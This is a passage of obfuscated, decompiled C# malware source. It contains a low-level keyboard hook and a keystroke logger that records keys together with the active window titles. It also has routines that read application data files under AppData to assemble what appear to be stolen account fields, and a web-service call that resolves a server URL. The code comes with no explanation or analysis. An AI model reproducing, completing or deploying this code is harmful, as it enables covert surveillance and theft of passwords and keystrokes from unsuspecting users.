          *(int*) num2 = 0;
          while (*(int*) ((IntPtr) voidPtr + 56) <= *(int*) ((IntPtr) voidPtr + 68))
          {
            if (arySrc[*(int*) ((IntPtr) voidPtr + 56)].\u0002 > 9L)
            {
              if (!\u0007.\u0001(arySrc[*(int*) ((IntPtr) voidPtr + 56)].\u0002))
              {
                if (Decimal.Compare(new Decimal(\u0003.\u0001.\u0001), 1M) == 0)
                  \u0003.\u0001.\u0001[checked (*(int*) unchecked ((IntPtr) voidPtr + 36) + *(int*) unchecked ((IntPtr) voidPtr + 32))].\u0001[*(int*) ((IntPtr) voidPtr + 56)] = Encoding.Default.GetString(\u0003.\u0001.\u0001, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal((ulong) *(long*) voidPtr), new Decimal(*(long*) ((IntPtr) voidPtr + 8))), new Decimal(*(int*) ((IntPtr) voidPtr + 48)))), checked ((int) arySrc[*(int*) unchecked ((IntPtr) voidPtr + 56)].\u0001));
                else if (Decimal.Compare(new Decimal(\u0003.\u0001.\u0001), 2M) == 0)
                  \u0003.\u0001.\u0001[checked (*(int*) unchecked ((IntPtr) voidPtr + 36) + *(int*) unchecked ((IntPtr) voidPtr + 32))].\u0001[*(int*) ((IntPtr) voidPtr + 56)] = Encoding.Unicode.GetString(\u0003.\u0001.\u0001, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal((ulong) *(long*) voidPtr), new Decimal(*(long*) ((IntPtr) voidPtr + 8))), new Decimal(*(int*) ((IntPtr) voidPtr + 48)))), checked ((int) arySrc[*(int*) unchecked ((IntPtr) voidPtr + 56)].\u0001));
                else if (Decimal.Compare(new Decimal(\u0003.\u0001.\u0001), 3M) == 0)
                  \u0003.\u0001.\u0001[checked (*(int*) unchecked ((IntPtr) voidPtr + 36) + *(int*) unchecked ((IntPtr) voidPtr + 32))].\u0001[*(int*) ((IntPtr) voidPtr + 56)] = Encoding.BigEndianUnicode.GetString(\u0003.\u0001.\u0001, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal((ulong) *(long*) voidPtr), new Decimal(*(long*) ((IntPtr) voidPtr + 8))), new Decimal(*(int*) ((IntPtr) voidPtr + 48)))), checked ((int) arySrc[*(int*) unchecked ((IntPtr) voidPtr + 56)].\u0001));
              }
              else
                \u0003.\u0001.\u0001[checked (*(int*) unchecked ((IntPtr) voidPtr + 36) + *(int*) unchecked ((IntPtr) voidPtr + 32))].\u0001[*(int*) ((IntPtr) voidPtr + 56)] = Encoding.Default.GetString(\u0003.\u0001.\u0001, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal((ulong) *(long*) voidPtr), new Decimal(*(long*) ((IntPtr) voidPtr + 8))), new Decimal(*(int*) ((IntPtr) voidPtr + 48)))), checked ((int) arySrc[*(int*) unchecked ((IntPtr) voidPtr + 56)].\u0001));
            }
            else
              \u0003.\u0001.\u0001[checked (*(int*) unchecked ((IntPtr) voidPtr + 36) + *(int*) unchecked ((IntPtr) voidPtr + 32))].\u0001[*(int*) ((IntPtr) voidPtr + 56)] = Conversions.ToString(\u0007.\u0001(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal((ulong) *(long*) voidPtr), new Decimal(*(long*) ((IntPtr) voidPtr + 8))), new Decimal(*(int*) ((IntPtr) voidPtr + 48)))), checked ((int) arySrc[*(int*) unchecked ((IntPtr) voidPtr + 56)].\u0001)));
            *(int*) ((IntPtr) voidPtr + 48) = checked ((int) ((long) *(int*) unchecked ((IntPtr) voidPtr + 48) + arySrc[*(int*) unchecked ((IntPtr) voidPtr + 56)].\u0001));
            *(int*) ((IntPtr) voidPtr + 56) = checked (*(int*) unchecked ((IntPtr) voidPtr + 56) + 1);
          }
          *(int*) ((IntPtr) voidPtr + 32) = checked (*(int*) unchecked ((IntPtr) voidPtr + 32) + 1);
        }
        goto label_35;
      }
      catch (Exception ex)
      {
        object[] objArray = new object[21]
        {
          (object) (bool) *(sbyte*) ((IntPtr) voidPtr + 82),
          (object) (ulong) *(long*) voidPtr,
          (object) *(int*) ((IntPtr) voidPtr + 32),
          (object) *(ushort*) ((IntPtr) voidPtr + 76),
          (object) *(int*) ((IntPtr) voidPtr + 36),
          (object) *(int*) ((IntPtr) voidPtr + 40),
          (object) *(int*) ((IntPtr) voidPtr + 44),
          (object) *(int*) ((IntPtr) voidPtr + 48),
          (object) arySrc,
          (object) *(int*) ((IntPtr) voidPtr + 52),
          (object) *(long*) ((IntPtr) voidPtr + 8),
          (object) *(long*) ((IntPtr) voidPtr + 16),
          (object) *(long*) ((IntPtr) voidPtr + 24),
          (object) *(int*) ((IntPtr) voidPtr + 56),
          (object) *(ushort*) ((IntPtr) voidPtr + 78),
          (object) *(ushort*) ((IntPtr) voidPtr + 80),
          (object) *(int*) ((IntPtr) voidPtr + 60),
          (object) *(int*) ((IntPtr) voidPtr + 64),
          (object) *(int*) ((IntPtr) voidPtr + 68),
          (object) *(int*) ((IntPtr) voidPtr + 72),
          (object) obj0
        };
        \u0007.\u0001(ex, objArray);
        throw;
      }
label_38:
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 83);
    }

    static void \u0001([In] \u000F.\u0006.\u0002 obj0, [In] int obj1)
    {
      try
      {
        if (true)
          obj0.\u0001 >>= obj1;
        else
          goto label_4;
label_2:
        if (true)
          obj0.\u0003 -= obj1;
label_4:
        if (false)
          goto label_2;
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u0002 obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) obj1;
        \u0007.\u0001(ex, (object) obj, (object) local);
        throw;
      }
    }

    static \u000F.\u0006.\u0004 \u0001([In] \u000F.\u0006.\u0005 obj0)
    {
      \u000F.\u0006.\u0004 obj1;
      byte[] destinationArray;
      try
      {
        byte[] numArray = new byte[obj0.\u0003];
        if (true)
          goto label_2;
label_1:
        if (true)
        {
          Array.Copy((Array) obj0.\u0002, obj0.\u0002, (Array) destinationArray, 0, obj0.\u0003);
          if (true)
          {
            obj1 = new \u000F.\u0006.\u0004(destinationArray);
            goto label_6;
          }
          else
            goto label_6;
        }
        else
          goto label_6;
label_2:
        destinationArray = numArray;
        goto label_1;
      }
      catch (Exception ex)
      {
        byte[] numArray = destinationArray;
        \u000F.\u0006.\u0005 obj2 = obj0;
        \u0007.\u0001(ex, (object) numArray, (object) obj2);
        throw;
      }
label_6:
      return obj1;
    }

    static void \u0001([In] \u0004.\u0002 obj0, [In] bool obj1) => obj0.\u0003 = obj1;

    static unsafe int \u0001([In] int obj0, [In] int obj1, [In] ref \u0002.\u0001.\u0002 obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(16);
      string[] strArray1;
      string Left;
      string str1;
      string str2;
      char[] chArray1;
      string[] strArray2;
      try
      {
        try
        {
          string str3 = \u0007.\u0001(\u0007.\u0001());
          if (true)
            Left = str3;
          if (Operators.CompareString(Left, \u0002.\u0001.\u0002, false) != 0)
          {
            \u0002.\u0001.\u0002 = Left;
            strArray1 = new string[7]
            {
              \u000E.\u0001.\u0012,
              Environment.NewLine,
              \u0007.\u0001(\u000E.\u0003.\u0001(2825), \u000E.\u0003.\u0001(55)),
              Left,
              \u0007.\u0001(\u000E.\u0003.\u0001(2890), \u000E.\u0003.\u0001(55)),
              Environment.NewLine,
              Environment.NewLine
            };
            \u000E.\u0001.\u0012 = string.Concat(strArray1);
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          str1 = \u000E.\u0003.\u0001(13);
          if (obj1 == 256 | obj1 == 260)
          {
            switch (obj2.\u0001)
            {
              case 8:
                \u000E.\u0001.\u0012 = \u000E.\u0001.\u0012.Substring(0, checked (\u000E.\u0001.\u0012.Length - 1));
                goto label_53;
              case 9:
                str1 = char.ConvertFromUtf32(9);
                goto label_53;
              case 13:
                str1 = Environment.NewLine;
                goto label_53;
              case 20:
                str1 = !Control.IsKeyLocked(Keys.Capital) ? \u0007.\u0001(\u000E.\u0003.\u0001(3197), \u000E.\u0003.\u0001(55)) : \u0007.\u0001(\u000E.\u0003.\u0001(3164), \u000E.\u0003.\u0001(55));
                goto label_53;
              case 27:
                str1 = \u0007.\u0001(\u000E.\u0003.\u0001(3147), \u000E.\u0003.\u0001(55));
                goto label_53;
              case 32:
                str1 = \u0007.\u0001(\u000E.\u0003.\u0001(3079), \u000E.\u0003.\u0001(55));
                goto label_53;
              case 35:
                str1 = \u0007.\u0001(\u000E.\u0003.\u0001(3436), \u000E.\u0003.\u0001(55));
                goto label_53;
              case 36:
                str1 = \u0007.\u0001(\u000E.\u0003.\u0001(3419), \u000E.\u0003.\u0001(55));
                goto label_53;
              case 37:
                str1 = \u0007.\u0001(\u000E.\u0003.\u0001(3053), \u000E.\u0003.\u0001(55));
                goto label_53;
              case 38:
                str1 = \u0007.\u0001(\u000E.\u0003.\u0001(3066), \u000E.\u0003.\u0001(55));
                goto label_53;
              case 39:
                if (true)
                {
                  str1 = \u0007.\u0001(\u000E.\u0003.\u0001(3027), \u000E.\u0003.\u0001(55));
                  goto label_53;
                }
                else
                  break;
              case 40:
                str1 = \u0007.\u0001(\u000E.\u0003.\u0001(3040), \u000E.\u0003.\u0001(55));
                goto label_53;
              case 46:
                str1 = \u0007.\u0001(\u000E.\u0003.\u0001(3130), \u000E.\u0003.\u0001(55));
                goto label_53;
              case 48:
              case 49:
              case 50:
              case 51:
              case 52:
              case 53:
              case 54:
              case 55:
              case 56:
              case 57:
                if (\u000F.\u0001.\u0001().Keyboard.ShiftKeyDown)
                {
                  str2 = \u0007.\u0001(\u000E.\u0003.\u0001(2955), \u000E.\u0003.\u0001(55));
                  string str4 = str2;
                  chArray1 = new char[1]
                  {
                    Conversions.ToChar(\u0007.\u0001(\u000E.\u0003.\u0001(2996), \u000E.\u0003.\u0001(55)))
                  };
                  char[] chArray2 = chArray1;
                  strArray2 = str4.Split(chArray2);
                  switch (obj2.\u0001)
                  {
                    case 48:
                      str1 = strArray2[9];
                      goto label_53;
                    case 49:
                      str1 = strArray2[0];
                      goto label_53;
                    case 50:
                      str1 = strArray2[1];
                      goto label_53;
                    case 51:
                      str1 = strArray2[2];
                      goto label_53;
                    case 52:
                      str1 = strArray2[3];
                      goto label_53;
                    case 53:
                      str1 = strArray2[4];
                      goto label_53;
                    case 54:
                      str1 = strArray2[5];
                      goto label_53;
                    case 55:
                      str1 = strArray2[6];
                      goto label_53;
                    case 56:
                      str1 = strArray2[7];
                      goto label_53;
                    case 57:
                      str1 = strArray2[8];
                      goto label_53;
                    default:
                      goto label_53;
                  }
                }
                else
                {
                  str1 = char.ConvertFromUtf32(obj2.\u0001);
                  goto label_53;
                }
              case 65:
              case 66:
              case 67:
              case 68:
              case 69:
              case 70:
              case 71:
              case 72:
              case 73:
              case 74:
              case 75:
              case 76:
              case 77:
              case 78:
              case 79:
              case 80:
              case 81:
              case 82:
              case 83:
              case 84:
              case 85:
              case 86:
              case 87:
              case 88:
              case 89:
              case 90:
                str1 = !\u000F.\u0001.\u0001().Keyboard.ShiftKeyDown ? char.ConvertFromUtf32(checked (obj2.\u0001 + 32)).ToLower() : char.ConvertFromUtf32(checked (obj2.\u0001 + 32)).ToUpper();
                goto label_53;
              case 112:
              case 113:
              case 114:
              case 115:
              case 116:
              case 117:
              case 118:
              case 119:
              case 120:
              case 121:
              case 122:
              case 123:
              case 124:
              case 125:
              case 126:
              case (int) sbyte.MaxValue:
              case 128:
              case 129:
              case 130:
              case 131:
              case 132:
              case 133:
              case 134:
              case 135:
                str1 = \u0007.\u0001(\u000E.\u0003.\u0001(3005), \u000E.\u0003.\u0001(55)) + Conversions.ToString(checked (obj2.\u0001 - 111)) + \u0007.\u0001(\u000E.\u0003.\u0001(3018), \u000E.\u0003.\u0001(55));
                goto label_53;
              case 162:
              case 163:
                str1 = \u0007.\u0001(\u000E.\u0003.\u0001(3088), \u000E.\u0003.\u0001(55));
                goto label_53;
              case 164:
              case 165:
                str1 = \u0007.\u0001(\u000E.\u0003.\u0001(3113), \u000E.\u0003.\u0001(55));
                goto label_53;
              case 186:
                str1 = !\u000F.\u0001.\u0001().Keyboard.ShiftKeyDown ? \u0007.\u0001(\u000E.\u0003.\u0001(3383), \u000E.\u0003.\u0001(55)) : \u0007.\u0001(\u000E.\u0003.\u0001(3374), \u000E.\u0003.\u0001(55));
                goto label_53;
              case 187:
                str1 = !\u000F.\u0001.\u0001().Keyboard.ShiftKeyDown ? \u0007.\u0001(\u000E.\u0003.\u0001(3311), \u000E.\u0003.\u0001(55)) : \u0007.\u0001(\u000E.\u0003.\u0001(3302), \u000E.\u0003.\u0001(55));
                goto label_53;
              case 188:
                str1 = !\u000F.\u0001.\u0001().Keyboard.ShiftKeyDown ? \u0007.\u0001(\u000E.\u0003.\u0001(3275), \u000E.\u0003.\u0001(55)) : \u0007.\u0001(\u000E.\u0003.\u0001(3266), \u000E.\u0003.\u0001(55));
                goto label_53;
              case 189:
                str1 = !\u000F.\u0001.\u0001().Keyboard.ShiftKeyDown ? \u0007.\u0001(\u000E.\u0003.\u0001(3257), \u000E.\u0003.\u0001(55)) : \u0007.\u0001(\u000E.\u0003.\u0001(3248), \u000E.\u0003.\u0001(55));
                goto label_53;
              case 190:
                if (\u000F.\u0001.\u0001().Keyboard.ShiftKeyDown)
                {
                  str1 = \u0007.\u0001(\u000E.\u0003.\u0001(3284), \u000E.\u0003.\u0001(55));
                  goto label_53;
                }
                else
                  break;
              case 191:
                str1 = !\u000F.\u0001.\u0001().Keyboard.ShiftKeyDown ? \u0007.\u0001(\u000E.\u0003.\u0001(1479), \u000E.\u0003.\u0001(55)) : \u0007.\u0001(\u000E.\u0003.\u0001(3410), \u000E.\u0003.\u0001(55));
                goto label_53;
              case 192:
                str1 = !\u000F.\u0001.\u0001().Keyboard.ShiftKeyDown ? \u0007.\u0001(\u000E.\u0003.\u0001(3239), \u000E.\u0003.\u0001(55)) : \u0007.\u0001(\u000E.\u0003.\u0001(3230), \u000E.\u0003.\u0001(55));
                goto label_53;
              case 219:
                str1 = !\u000F.\u0001.\u0001().Keyboard.ShiftKeyDown ? \u0007.\u0001(\u000E.\u0003.\u0001(3329), \u000E.\u0003.\u0001(55)) : \u0007.\u0001(\u000E.\u0003.\u0001(3320), \u000E.\u0003.\u0001(55));
                goto label_53;
              case 220:
                str1 = !\u000F.\u0001.\u0001().Keyboard.ShiftKeyDown ? \u0007.\u0001(\u000E.\u0003.\u0001(3365), \u000E.\u0003.\u0001(55)) : \u0007.\u0001(\u000E.\u0003.\u0001(3356), \u000E.\u0003.\u0001(55));
                goto label_53;
              case 221:
                str1 = !\u000F.\u0001.\u0001().Keyboard.ShiftKeyDown ? \u0007.\u0001(\u000E.\u0003.\u0001(3347), \u000E.\u0003.\u0001(55)) : \u0007.\u0001(\u000E.\u0003.\u0001(3338), \u000E.\u0003.\u0001(55));
                goto label_53;
              case 222:
                str1 = !\u000F.\u0001.\u0001().Keyboard.ShiftKeyDown ? \u0007.\u0001(\u000E.\u0003.\u0001(3401), \u000E.\u0003.\u0001(55)) : \u0007.\u0001(\u000E.\u0003.\u0001(3392), \u000E.\u0003.\u0001(55));
                goto label_53;
              default:
                str1 = char.ConvertFromUtf32(obj2.\u0001);
                goto label_53;
            }
            str1 = \u0007.\u0001(\u000E.\u0003.\u0001(3293), \u000E.\u0003.\u0001(55));
label_53:
            \u000E.\u0001.\u0012 += str1;
            \u000E.\u0001.\u001E = \u000E.\u0001.\u0012;
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        *(int*) ((IntPtr) voidPtr + 12) = *(int*) voidPtr;
      }
      catch (Exception ex)
      {
        object[] objArray = new object[12]
        {
          (object) *(int*) voidPtr,
          (object) Left,
          (object) str1,
          (object) strArray2,
          (object) str2,
          (object) strArray1,
          (object) *(int*) ((IntPtr) voidPtr + 4),
          (object) chArray1,
          (object) *(int*) ((IntPtr) voidPtr + 8),
          (object) obj0,
          (object) obj1,
          (object) obj2
        };
        \u0007.\u0001(ex, objArray);
        throw;
      }
      return *(int*) ((IntPtr) voidPtr + 12);
    }

    static void \u0001([In] ref double obj0)
    {
label_0:
      DateTime now;
      DateTime t2;
      try
      {
        try
        {
          now = DateAndTime.Now;
          t2 = now.AddSeconds(obj0);
          while (true)
          {
            if (true)
            {
              if (DateTime.Compare(DateAndTime.Now, t2) < 0)
                Application.DoEvents();
              else
                break;
            }
            else
              goto label_0;
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          if (false)
            return;
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<DateTime> local1 = (ValueType) t2;
        // ISSUE: variable of a boxed type
        __Boxed<DateTime> local2 = (ValueType) now;
        // ISSUE: variable of a boxed type
        __Boxed<double> local3 = (ValueType) obj0;
        \u0007.\u0001(ex, (object) local1, (object) local2, (object) local3);
        throw;
      }
    }

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern int \u0001([In] int obj0, [In] StringBuilder obj1, [In] int obj2);

    static void \u0001()
    {
      string str1;
      string str2;
      string str3;
      string Left;
      string str4;
      string str5;
      string[] strArray1;
      string str6;
      string str7;
      try
      {
        try
        {
          str7 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007.\u0001(\u000E.\u0003.\u0001(3453), \u000E.\u0003.\u0001(55));
          str1 = \u0007.\u0001(str7);
          str2 = \u0007.\u0001(\u0007.\u0001(\u000E.\u0003.\u0001(3494), \u000E.\u0003.\u0001(55)) + str1 + \u0007.\u0001(\u000E.\u0003.\u0001(3587), \u000E.\u0003.\u0001(55)));
          str3 = \u0007.\u0001(\u0007.\u0001(\u000E.\u0003.\u0001(3600), \u000E.\u0003.\u0001(55)) + str1 + \u0007.\u0001(\u000E.\u0003.\u0001(3693), \u000E.\u0003.\u0001(55)));
          Left = \u0007.\u0001(\u0007.\u0001(\u000E.\u0003.\u0001(3706), \u000E.\u0003.\u0001(55)) + str1 + \u0007.\u0001(\u000E.\u0003.\u0001(3799), \u000E.\u0003.\u0001(55)));
          str4 = \u0007.\u0001(\u0007.\u0001(\u000E.\u0003.\u0001(3812), \u000E.\u0003.\u0001(55)) + str1 + \u0007.\u0001(\u000E.\u0003.\u0001(3905), \u000E.\u0003.\u0001(55)));
          str5 = \u0007.\u0001(\u0007.\u0001(\u000E.\u0003.\u0001(3918), \u000E.\u0003.\u0001(55)) + str1 + \u0007.\u0001(\u000E.\u0003.\u0001(4011), \u000E.\u0003.\u0001(55)));
          if (Operators.CompareString(Left, \u000E.\u0003.\u0001(13), false) != 0)
          {
            strArray1 = new string[20]
            {
              \u0007.\u0001(\u000E.\u0003.\u0001(4024), \u000E.\u0003.\u0001(55)),
              Environment.NewLine,
              Environment.NewLine,
              \u0007.\u0001(\u000E.\u0003.\u0001(4089), \u000E.\u0003.\u0001(55)),
              str5,
              Environment.NewLine,
              \u0007.\u0001(\u000E.\u0003.\u0001(4106), \u000E.\u0003.\u0001(55)),
              str2,
              \u0007.\u0001(\u000E.\u0003.\u0001(3374), \u000E.\u0003.\u0001(55)),
              str3,
              Environment.NewLine,
              \u0007.\u0001(\u000E.\u0003.\u0001(4123), \u000E.\u0003.\u0001(55)),
              Left,
              Environment.NewLine,
              \u0007.\u0001(\u000E.\u0003.\u0001(4148), \u000E.\u0003.\u0001(55)),
              str4,
              \u0007.\u0001(\u000E.\u0003.\u0001(4173), \u000E.\u0003.\u0001(55)),
              Environment.NewLine,
              Environment.NewLine,
              \u0007.\u0001(\u000E.\u0003.\u0001(4198), \u000E.\u0003.\u0001(55))
            };
            str6 = string.Concat(strArray1);
          }
          else
          {
            strArray1 = new string[7]
            {
              \u0007.\u0001(\u000E.\u0003.\u0001(4024), \u000E.\u0003.\u0001(55)),
              Environment.NewLine,
              Environment.NewLine,
              \u0007.\u0001(\u000E.\u0003.\u0001(4259), \u000E.\u0003.\u0001(55)),
              Environment.NewLine,
              Environment.NewLine,
              \u0007.\u0001(\u000E.\u0003.\u0001(4288), \u000E.\u0003.\u0001(55))
            };
            str6 = string.Concat(strArray1);
          }
          \u000E.\u0001.\u0002 = str6;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          \u000E.\u0001.\u0002 = \u000E.\u0003.\u0001(13);
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        string str8 = str6;
        string str9 = str5;
        string str10 = str1;
        string str11 = str2;
        string str12 = str7;
        string str13 = str3;
        string str14 = str4;
        string str15 = Left;
        string[] strArray2 = strArray1;
        \u0007.\u0001(ex, (object) str8, (object) str9, (object) str10, (object) str11, (object) str12, (object) str13, (object) str14, (object) str15, (object) strArray2);
        throw;
      }
    }

    static void \u0001([In] \u0002.\u0003 obj0, [In] \u0004.\u0001 obj1)
    {
      \u0004.\u0001 obj2;
      if (true)
      {
        if (true)
          obj2 = obj0.\u0001;
      }
      else
        goto label_5;
label_2:
      \u0004.\u0001 comparand;
      if (true)
      {
        \u0004.\u0001 obj3 = obj2;
        if (true)
        {
          comparand = obj3;
          goto label_9;
        }
        else
          goto label_9;
      }
label_4:
      if (obj2 != comparand)
        goto label_2;
label_5:
      if (true)
        return;
label_9:
      \u0004.\u0001 obj4 = comparand + obj1;
      obj2 = Interlocked.CompareExchange<\u0004.\u0001>(ref obj0.\u0001, obj4, comparand);
      goto label_4;
    }

    static unsafe bool \u0001([In] int obj0, [In] \u000F.\u0006.\u0007 obj1, [In] int obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(9);
      short[] numArray1;
      IntPtr index1;
      int num1;
      try
      {
        obj1.\u0001[obj1.\u0001] = (short) obj2;
        byte[] numArray2 = obj1.\u0002;
        \u000F.\u0006.\u0007 obj = obj1;
        int num2 = obj.\u0001;
        if (true)
          goto label_7;
label_2:
        obj.\u0001 = num2 + 1;
        int index2 = num1;
        int num3 = (int) (byte) (obj0 - 3);
        numArray2[index2] = (byte) num3;
        *(int*) voidPtr = \u0007.\u0001(obj1, obj0 - 3);
        (numArray1 = obj1.\u0001.\u0001)[(int) (index1 = (IntPtr) *(int*) voidPtr)] = (short) ((int) numArray1[index1] + 1);
        if (*(int*) voidPtr >= 265 && *(int*) voidPtr < 285)
          obj1.\u0002 += (*(int*) voidPtr - 261) / 4;
        *(int*) ((IntPtr) voidPtr + 4) = \u0007.\u0001(obj1, obj2 - 1);
        (numArray1 = obj1.\u0002.\u0001)[(int) (index1 = (IntPtr) *(int*) ((IntPtr) voidPtr + 4))] = (short) ((int) numArray1[index1] + 1);
        if (*(int*) ((IntPtr) voidPtr + 4) >= 4)
          obj1.\u0002 += *(int*) ((IntPtr) voidPtr + 4) / 2 - 1;
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) \u0007.\u0001(obj1);
        goto label_9;
label_7:
        num1 = num2;
        goto label_2;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) num1;
        short[] numArray3 = numArray1;
        // ISSUE: variable of a boxed type
        __Boxed<IntPtr> local4 = (ValueType) index1;
        \u000F.\u0006.\u0007 obj = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local6 = (ValueType) obj0;
        \u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) numArray3, (object) local4, (object) obj, (object) local5, (object) local6);
        throw;
      }
label_9:
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 8);
    }

    static void \u0001([In] \u0004.\u0003 obj0, [In] \u0002.\u0004 obj1)
    {
      if (obj0.\u0003 == null)
      {
        try
        {
          UploadReportLoginService reportLoginService1 = new UploadReportLoginService();
          do
          {
            if (obj0.\u0001 != null)
            {
              UploadReportLoginService reportLoginService2 = reportLoginService1;
              IWebProxy webProxy = obj0.\u0001;
              if (true)
                reportLoginService2.Proxy = webProxy;
            }
            obj0.\u0003 = reportLoginService1.GetServerURL(obj0.\u0002);
            if (obj0.\u0003.Length != 0)
            {
              if (!(obj0.\u0003 == \u000E.\u0003.\u0001(4390)))
                goto label_11;
            }
            else
              goto label_2;
          }
          while (false);
          goto label_5;
label_2:
          throw new ApplicationException(\u000E.\u0003.\u0001(4349));
label_5:
          obj0.\u0003 = \u0004.\u0003.\u0001;
        }
        catch (Exception ex)
        {
          obj1(\u000E.\u0003.\u0001(4399) + ex.Message);
          return;
        }
      }
label_11:
      obj1(obj0.\u0003.StartsWith(\u000E.\u0003.\u0001(4416)) ? obj0.\u0003 : \u000E.\u0003.\u0001(4421));
    }

    static bool \u0001([In] \u000F.\u0006.\u000E obj0)
    {
      bool flag;
      try
      {
        do
        {
          flag = obj0.\u0002 == 0;
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u000E obj = obj0;
        \u0007.\u0001(ex, (object) obj);
        throw;
      }
      return flag;
    }

    static bool \u0001([In] \u000F.\u0006.\u0006 obj0)
    {
      bool flag;
      try
      {
        do
        {
          int num;
          if (obj0.\u0001 != 30)
          {
            num = 0;
            if (num == 0)
              flag = num != 0;
            else
              goto label_4;
          }
          else
            goto label_3;
label_2:
          continue;
label_3:
          num = \u0007.\u0001(obj0.\u0001) ? 1 : 0;
label_4:
          flag = num != 0;
          if (false)
            goto label_2;
          else
            break;
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u0006 obj = obj0;
        \u0007.\u0001(ex, (object) obj);
        throw;
      }
      return flag;
    }

    static Exception \u0001([In] \u0005.\u0003 obj0) => obj0.\u0001;

    static void \u0001()
    {
      try
      {
        try
        {
          \u0002.\u0001.\u0001 = new \u0002.\u0001.\u0001(\u0007.\u0001);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          do
          {
            ProjectData.ClearProjectError();
          }
          while (false);
        }
        try
        {
          if (false)
            return;
          \u0002.\u0001.\u0001 = (IntPtr) \u0007.\u0001(13, \u0002.\u0001.\u0001, (int) Process.GetCurrentProcess().MainModule.BaseAddress, 0);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        \u0007.\u0001(ex);
        throw;
      }
    }

    static string \u0001() => \u0007.\u0001().\u0001;

    static void \u0001()
    {
      string str1;
      string str2;
      string str3;
      string str4;
      string Left;
      string str5;
      string str6;
      string[] strArray1;
      string str7;
      try
      {
        try
        {
          str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007.\u0001(\u000E.\u0003.\u0001(4426), \u000E.\u0003.\u0001(55)) + FileSystem.Dir(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007.\u0001(\u000E.\u0003.\u0001(4515), \u000E.\u0003.\u0001(55)));
          str2 = \u0007.\u0001(str1);
          string str8 = \u0007.\u0001(\u000E.\u0003.\u0001(4608), \u000E.\u0003.\u0001(55));
          str3 = \u0007.\u0001(\u0007.\u0001(\u000E.\u0003.\u0001(4625), \u000E.\u0003.\u0001(55)), str2, str8);
          string str9 = \u0007.\u0001(\u000E.\u0003.\u0001(4642), \u000E.\u0003.\u0001(55));
          str4 = \u0007.\u0001(\u0007.\u0001(\u000E.\u0003.\u0001(4659), \u000E.\u0003.\u0001(55)), str2, str9);
          string str10 = \u0007.\u0001(\u000E.\u0003.\u0001(4676), \u000E.\u0003.\u0001(55));
          Left = \u0007.\u0001(\u0007.\u0001(\u000E.\u0003.\u0001(4693), \u000E.\u0003.\u0001(55)), str2, str10);
          string str11 = \u0007.\u0001(\u000E.\u0003.\u0001(4710), \u000E.\u0003.\u0001(55));
          str5 = \u0007.\u0001(\u0007.\u0001(\u000E.\u0003.\u0001(4735), \u000E.\u0003.\u0001(55)), str2, str11);
          string str12 = \u0007.\u0001(\u000E.\u0003.\u0001(4760), \u000E.\u0003.\u0001(55));
          str6 = \u0007.\u0001(\u0007.\u0001(\u000E.\u0003.\u0001(4777), \u000E.\u0003.\u0001(55)), str2, str12);
          if (Operators.CompareString(Left, \u000E.\u0003.\u0001(13), false) != 0)
          {
            strArray1 = new string[18];
            strArray1[0] = \u0007.\u0001(\u000E.\u0003.\u0001(4794), \u000E.\u0003.\u0001(55));
            if (false)
              return;
            strArray1[1] = Environment.NewLine;
            strArray1[2] = \u0007.\u0001(\u000E.\u0003.\u0001(4859), \u000E.\u0003.\u0001(55));
            strArray1[3] = str6;
            strArray1[4] = Environment.NewLine;
            strArray1[5] = \u0007.\u0001(\u000E.\u0003.\u0001(4876), \u000E.\u0003.\u0001(55));
            strArray1[6] = str3;
            strArray1[7] = \u0007.\u0001(\u000E.\u0003.\u0001(4893), \u000E.\u0003.\u0001(55));
            strArray1[8] = str4;
            strArray1[9] = Environment.NewLine;
            strArray1[10] = \u0007.\u0001(\u000E.\u0003.\u0001(4902), \u000E.\u0003.\u0001(55));
            strArray1[11] = Left;
            strArray1[12] = Environment.NewLine;
            strArray1[13] = \u0007.\u0001(\u000E.\u0003.\u0001(4927), \u000E.\u0003.\u0001(55));
            strArray1[14] = str5;
            strArray1[15] = \u0007.\u0001(\u000E.\u0003.\u0001(4952), \u000E.\u0003.\u0001(55));
            strArray1[16] = Environment.NewLine;
            strArray1[17] = \u0007.\u0001(\u000E.\u0003.\u0001(4977), \u000E.\u0003.\u0001(55));
